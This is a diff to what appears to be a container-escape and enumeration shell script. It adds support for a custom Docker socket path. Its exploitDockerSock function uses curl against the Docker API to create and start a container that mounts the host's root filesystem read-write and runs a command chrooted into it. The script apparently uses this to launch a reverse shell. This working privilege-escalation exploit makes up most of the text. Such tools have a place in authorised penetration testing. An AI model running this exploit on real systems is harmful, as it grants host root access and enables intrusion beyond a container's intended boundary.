@@ -409,9 +409,11 @@ dockerSockCheck() {
   if [ -S "/var/run/docker.sock" ]; then
     dockerSockPath="/var/run/docker.sock"
     printYes
+  elif [ -n "$DOCKER_SOCK_PATH" ] && [ -S "$DOCKER_SOCK_PATH" ]; then
+    dockerSockPath="$DOCKER_SOCK_PATH"
+    printYes
   else
-    printFail "Not Found"
-    # TODO: Search elsewhere for sock?
+    printFail "Docker socket not found"
   fi
 
   if [ "$dockerSockPath" ]; then
@@ -1074,7 +1076,7 @@ exploitDockerSock() {
   nl
 
   # Try to find an available docker image
-  json_data=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json)
+  json_data=$(curl -s --unix-socket "$dockerSockPath" http://localhost/images/json)
   docker_img=$(echo "$json_data" | grep -o '"RepoTags":\["[^"]*' | grep -o '[^"]*$' | tail -1)
 
   if [ -z "$docker_img" ]; then
@@ -1084,7 +1086,7 @@ exploitDockerSock() {
 
   # Create docker container using the docker sock
   payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$cmd\\\"\"]"
-  response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"$docker_img\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
+  response=$(curl -s -XPOST --unix-socket "$dockerSockPath" -d "{\"Image\":\"$docker_img\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
 
   if ! [ $? ]; then
     printError 'Something went wrong'
@@ -1096,10 +1098,10 @@ exploitDockerSock() {
   printQuestion "Creating container ....."
   printSuccess "$revShellContainerID"
 
-  startCmd="curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start"
-  logsCmd="curl -s --unix-socket /var/run/docker.sock \"http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1\" --output -"
-  deleteCmd="curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/stop"
-  removeCmd="curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID"
+  startCmd="curl -s -XPOST --unix-socket $dockerSockPath http://localhost/containers/$revShellContainerID/start"
+  logsCmd="curl -s --unix-socket $dockerSockPath \"http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1\" --output -"
+  deleteCmd="curl -s -XPOST --unix-socket $dockerSockPath http://localhost/containers/$revShellContainerID/stop"
+  removeCmd="curl -s -XDELETE --unix-socket $dockerSockPath http://localhost/containers/$revShellContainerID"
 
   printQuestion "If the shell dies you can restart your listener and run the start command to fire it again"
   nl
